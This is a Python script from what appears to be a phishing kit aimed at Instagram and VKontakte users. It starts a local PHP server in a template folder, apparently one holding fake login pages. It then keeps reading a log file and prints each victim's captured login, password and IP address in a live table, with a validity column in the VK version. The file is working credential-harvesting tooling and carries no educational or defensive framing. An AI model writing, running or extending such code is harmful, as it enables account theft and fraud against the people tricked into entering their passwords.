import os
from multiprocessing import Process
from sh import php
from prettytable import PrettyTable
from assets.modules import messages

messages.clear_terminal()
log_list = list()


def instagram():
    os.chdir(
        os.path.join("templates", "instagram")
    )

    Process(
        target=php,
        args=("-S", "localhost:8080")
    ).start()

    print("Сайт запущен на порту 8080")
    print()

    table = PrettyTable()
    table.field_names = ("Логин", "Пароль", "IP")
    print(table)

    while True:
        with open("log.log") as f:
            logs = f.read().strip("\n")

            for log in logs.splitlines():
                if log not in log_list:
                    table.add_row(log.split(":"))

                    messages.clear_terminal()

                    print("Сайт запущен на порту 8080")
                    print()

                    print(table)

                    log_list.append(log)


def vkontakte():
    os.chdir(
        os.path.join("templates", "vk")
    )

    Process(
        target=php,
        args=("-S", "localhost:8080")
    ).start()

    print("Сайт запущен на порту 8080")
    print()

    table = PrettyTable()
    table.field_names = ("Логин", "Пароль", "Валид?", "IP")
    print(table)

    while True:
        with open("log.log") as f:
            logs = f.read().strip("\n")

            for log in logs.splitlines():
                if log not in log_list:
                    table.add_row(log.split(":"))

                    messages.clear_terminal()

                    print("Сайт запущен на порту 8080")
                    print()

                    print(table)

                    log_list.append(log)
